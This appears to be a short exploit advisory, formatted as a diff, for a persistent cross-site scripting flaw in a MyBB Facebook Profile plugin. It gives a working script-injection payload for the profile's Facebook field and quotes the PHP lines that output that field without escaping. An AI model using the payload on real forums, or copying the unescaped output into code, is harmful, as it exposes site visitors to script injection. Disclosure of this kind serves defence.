@@ -1,0 +1,38 @@
+# Exploit Title: MyBB Facebook Profile Plugin Persistant XSS
+# Date: 12/12/2012
+# Exploit Author: limb0
+# Vendor Homepage: http://www.collectiontricks.it/
+# Software Link: http://mods.mybb.com/view/facebook-profile-link-on-postbit-2-2
+# Version: 2.4
+# Tested on: Linux
+
+###################################P-XSS######################################
+
+Installation:
+
+1. Upload all folder to your MyBB installation directory.
+2. Go to your Admin-CP and click Plugins.
+3. Click Install & Activate.
+
+Configuration:
+
+User-CP >> Edit Profile >> Facebook id/nickname >> Type: "><script>alert(/limb0/)</script>
+Then visit one of your threads,and voila.
+
+Proofs:
+Configuration:http://postimage.org/image/sumvqlro7/
+Testing:http://postimage.org/image/57tjltqb9/
+
+-------------------------------Vulnerable Code---------------------------------------
+Line 200-216
+					$post["iconfacebook"] = '<a href="http://www.facebook.com/' . $post["facebook"] .'" TARGET=_BLANK><img src="'.$mybb->settings['bburl'].'/images/facebook.gif' .'" /></a>';
+					} else 
+					{
+					}
+                } else {
+					$post["iconfacebook"] = '<a href="http://www.facebook.com/' . $post["facebook"] .'" TARGET=_BLANK><img src="'.$mybb->settings['bburl'].'/images/facebook.gif' .'" /></a>';
+				}	
+            }
+
+
+This vulnerable is dedicated to my brothers. <3
